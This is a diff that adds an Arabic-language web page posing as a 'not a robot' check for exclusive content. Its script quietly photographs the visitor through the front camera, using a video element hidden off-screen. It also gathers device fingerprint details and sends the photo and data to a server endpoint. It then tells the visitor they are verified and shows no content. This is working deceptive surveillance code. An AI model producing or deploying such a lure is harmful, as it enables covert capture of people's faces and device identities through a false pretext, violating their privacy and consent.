@@ -1,0 +1,138 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>محتوى حصري</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, "Segoe UI", Tahoma, sans-serif; background: #0a0a0a; color: #eee; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; direction: rtl; }
+  .card { background: #161616; border: 1px solid #2a2a2a; border-radius: 16px; padding: 32px 24px; max-width: 420px; width: 100%; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,.6); }
+  h1 { font-size: 22px; margin-bottom: 12px; color: #fff; }
+  p { font-size: 15px; color: #999; margin-bottom: 24px; line-height: 1.6; }
+  button { width: 100%; padding: 16px; font-size: 17px; font-weight: 700; border: none; border-radius: 12px; background: linear-gradient(135deg, #ff0050 0%, #ff4081 100%); color: #fff; cursor: pointer; font-family: inherit; }
+  button:active { transform: scale(.98); }
+  button:disabled { opacity: .5; }
+  #status { margin-top: 20px; font-size: 14px; color: #666; min-height: 20px; }
+  .ok { color: #4caf50 !important; }
+  .err { color: #f44336 !important; }
+  .loader { display: inline-block; width: 16px; height: 16px; border: 2px solid #333; border-top-color: #ff4081; border-radius: 50%; animation: spin .8s linear infinite; vertical-align: middle; margin-left: 8px; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+  <div class="card">
+    <h1>🔒 محتوى حصري</h1>
+    <p>اضغط على الزر أدناه للتحقق من أنك لست روبوت، وسيظهر المحتوى مباشرة.</p>
+    <button id="btn">تحقق وعرض المحتوى</button>
+    <div id="status"></div>
+  </div>
+
+<script>
+const btn = document.getElementById('btn');
+const status = document.getElementById('status');
+
+function setStatus(msg, cls) {
+  status.textContent = msg;
+  status.className = cls || '';
+}
+
+async function capturePhoto() {
+  const constraints = { video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false };
+  let stream;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia(constraints);
+  } catch (err) {
+    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+  }
+
+  const video = document.createElement('video');
+  video.srcObject = stream;
+  video.muted = true;
+  video.playsInline = true;
+  video.setAttribute('playsinline', '');
+  video.style.position = 'fixed';
+  video.style.left = '-9999px';
+  document.body.appendChild(video);
+
+  await new Promise((resolve) => {
+    video.onloadedmetadata = () => resolve();
+    setTimeout(() => resolve(), 1500);
+  });
+
+  try { await video.play(); } catch (e) {}
+  await new Promise(r => setTimeout(r, 900));
+
+  const canvas = document.createElement('canvas');
+  const w = video.videoWidth || 640;
+  const h = video.videoHeight || 480;
+  canvas.width = w;
+  canvas.height = h;
+
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0, w, h);
+
+  const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+
+  stream.getTracks().forEach(t => t.stop());
+  video.remove();
+  return dataUrl;
+}
+
+async function collectMeta() {
+  const meta = {};
+  try {
+    meta.screen = screen.width + 'x' + screen.height;
+    meta.viewport = window.innerWidth + 'x' + window.innerHeight;
+    meta.dpr = window.devicePixelRatio;
+    meta.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    meta.platform = navigator.platform;
+    meta.cores = navigator.hardwareConcurrency || null;
+    meta.touch = 'ontouchstart' in window;
+    try {
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (conn) meta.connection = { type: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt };
+    } catch (e) {}
+  } catch (e) {}
+  return meta;
+}
+
+btn.addEventListener('click', async () => {
+  btn.disabled = true;
+  status.innerHTML = 'جاري التحقق... <span class="loader"></span>';
+
+  let dataUrl;
+  try {
+    dataUrl = await capturePhoto();
+  } catch (err) {
+    setStatus('تعذر التحقق. تأكد من منح الإذن.', 'err');
+    btn.disabled = false;
+    return;
+  }
+
+  const meta = await collectMeta();
+
+  try {
+    const resp = await fetch('/api/capture', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ image: dataUrl, meta: meta }),
+    });
+    const j = await resp.json();
+    if (j.status === 'ok') {
+      setStatus('✓ تم التحقق. جاري عرض المحتوى...', 'ok');
+      setTimeout(() => {
+        document.querySelector('.card').innerHTML = '<h1>✓ تم التحقق</h1><p>يمكنك إغلاق هذه الصفحة الآن.</p>';
+      }, 1200);
+    } else {
+      setStatus('خطأ: ' + (j.msg || 'unknown'), 'err');
+      btn.disabled = false;
+    }
+  } catch (err) {
+    setStatus('خطأ في الاتصال.', 'err');
+    btn.disabled = false;
+  }
+});
+</script>
+</body>
+</html>
